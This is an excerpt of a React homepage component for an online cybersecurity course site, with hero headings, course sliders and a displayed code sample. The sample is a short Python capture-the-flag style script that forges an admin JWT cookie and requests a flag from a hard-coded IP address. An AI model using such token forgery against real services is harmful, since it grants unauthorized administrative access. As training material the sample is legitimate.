    ...
    <React.Fragment>
      ...
      <div className=" ">
        ...
        <div className="relative h-[450px] md:h-[550px] justify-center mx-auto flex flex-col w-11/12 max-w-maxContent items-center text-white ">
          ...
          >
            With our online Cybersecurity & Programming courses, you can learn
            at your own pace, from anywhere in the world, and get access to a
            ...
            <CodeBlocks
              ...
              heading={
                <div className="text-3xl lg:text-4xl font-semibold">
                  Unlock Your
                  <HighlightText text={"cyber potential "} />
                  with our online courses
                </div>
              }
              subheading={
                "Our courses are designed and taught by industry experts who have years of experience in cybersecurity, programming and are passionate ABOUT sharing their knowledge with you."
              }
              ctabtn1={{
...
// `}
          ...
          <div>
            <CodeBlocks
              ...
              heading={
                <div className="w-[100%] text-3xl lg:text-4xl font-semibold lg:w-[70%]">
                  Start
                  <HighlightText text={"hacking"} />
                </div>
              }
              subheading={
            ...
            //   codeblock={`import React from "react";\n import CTAButton from "./Button";\nimport TypeAnimation from "react-type";\nimport { FaArrowRight } from "react-icons/fa";\n\nconst Home = () => {\nreturn (\n<div>Home</div>\n)\n}\nexport default Home;`}
              codeblock={`import requests
                            ...
                            import time
                            def get_admin_token():
                                payload = {'admin': True, 'now': time.time()}
                                token = jwt.encode(payload, secret, algorithm='HS256')
                                return token
                            admin_token = get_admin_token()
                            cookies = {'jwt': admin_token}
                            response = requests.get('http://194.163.139.186:32951/get_flag', cookies=cookies)
                            print(f"Response from /get_flag: {response.text}")
`}
          ...
          <div className="mx-auto box-content w-full max-w-maxContentTab px- py-12 lg:max-w-maxContent">
            ...
            <Course_Slider Courses={CatalogPageData?.selectedCategory} />
          </div>
          <div className=" mx-auto box-content w-full max-w-maxContentTab px- py-12 lg:max-w-maxContent">
            <h2 className="text-white mb-6 text-2xl ">
            ...
            <div className="flex flex-col lg:flex-row gap-5 mb-10 mt-[95px]">
              ...
              <div className="flex flex-col gap-10 w-full lg:w-[40%] items-start">
                <div className="text-[16px]">
                  The modern CyberCafe is the dictates its own terms. Today, to
